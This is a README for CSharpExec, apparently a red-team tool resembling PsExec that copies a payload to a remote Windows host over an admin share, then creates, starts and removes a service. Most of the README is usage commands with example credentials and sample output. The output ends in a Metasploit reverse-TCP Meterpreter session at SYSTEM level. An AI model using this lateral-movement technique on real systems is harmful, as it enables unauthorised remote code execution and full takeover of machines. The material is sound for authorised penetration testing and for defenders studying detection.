# CSharpExec

PSExec, kinda.

This project can use both the current context and credentials to connect to a remote host, copy the payload, and then create and start a service. Once the service is running, it will then remove it. 

## Usage
```
[*] Usage: .\CSharpExec.exe <Host> [<Username>] [<Password>] <Path2Exe>
[*] Example 1: .\CSharpExec.exe 192.168.0.1 Administrator Password123! c:\beacon-svc.exe
[*] Example 2: .\CSharpExec.exe 192.168.0.1 Administrator Password123! c:\beacon-svc.exe C$
[*] Example 3: .\CSharpExec.exe 192.168.0.1 c:\beacon-svc.exe
[*] Example 4: .\CSharpExec.exe 192.168.0.1 c:\beacon-svc.exe C$
```

Like most of this stuff I write, its fairly verbose so it should be obvious(?) if something goes wrong. Heres some example output:
```
[*] Using: \\10.10.11.115\c$
[*] Using credentials: Administrator:Password123!
[*] Attempting to connect to: \\10.10.11.115\c$
[+] Response from share: NO_ERROR
[*] Copying shell-svc.exe to \\10.10.11.115\c$\Y5IuCQ8h
[+] Copied to \\10.10.11.115\c$\Y5IuCQ8h
[*] Attempting to create service: Y5IuCQ8h
[+] Handle for OpenSCManager obtained: 13645056
[+] Handle for CreateService obtained: 13645056
[+] Y5IuCQ8h created!
[*] Attempting to start the service...
[+] Y5IuCQ8h was started!
[*] Session should have returned, uninstalling Y5IuCQ8h
[*] Attempting to remove the service...
[+] Y5IuCQ8h was deleted!
```
As expected, this returns `SYSTEM`:
```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.11.119:443 
[*] Sending stage (201283 bytes) to 10.10.11.115
[*] Meterpreter session 7 opened (10.10.11.119:443 -> 10.10.11.115:59263) at 2020-07-26 00:06:05 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

```

I borrowed some enums from [this project](https://github.com/malcomvetter/CSExec/blob/master/csexec/Program.cs) which is similar, but takes a different approach.